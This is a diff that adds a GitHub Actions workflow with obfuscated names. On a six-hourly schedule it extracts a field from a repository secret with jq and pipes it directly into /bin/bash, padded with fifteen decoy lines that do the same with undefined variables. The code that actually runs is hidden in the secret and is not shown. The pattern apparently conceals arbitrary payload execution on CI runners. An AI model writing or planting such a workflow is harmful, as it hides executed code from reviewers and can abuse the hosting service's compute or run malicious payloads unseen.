@@ -1,0 +1,31 @@
+name: zhengqilu9810
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhengqilu9810
+        env:
+          t221: ${{ secrets.t221 }}
+        run: |
+          echo $t221 | jq -r .ehct35026 | /bin/bash
+          echo $vxxd7789 | jq -r .ppqmu64198 | /bin/bash
+          echo $wkbfa31 | jq -r .ztl11 | /bin/bash
+          echo $hq4 | jq -r .p63199 | /bin/bash
+          echo $ietp51449 | jq -r .nfxk90838 | /bin/bash
+          echo $sggh5 | jq -r .lkc64 | /bin/bash
+          echo $cqlk468 | jq -r .xyx897 | /bin/bash
+          echo $jhmi9 | jq -r .f30 | /bin/bash
+          echo $vqjmd1 | jq -r .zyi13 | /bin/bash
+          echo $wjd241 | jq -r .x7313 | /bin/bash
+          echo $oydm673 | jq -r .ilk3 | /bin/bash
+          echo $oppn45363 | jq -r .hy32 | /bin/bash
+          echo $cfn298 | jq -r .dnueb1422 | /bin/bash
+          echo $lxha4 | jq -r .yxsl6 | /bin/bash
+          echo $lybpe857 | jq -r .vqdn03 | /bin/bash
+          echo $r0 | jq -r .pen6 | /bin/bash
+
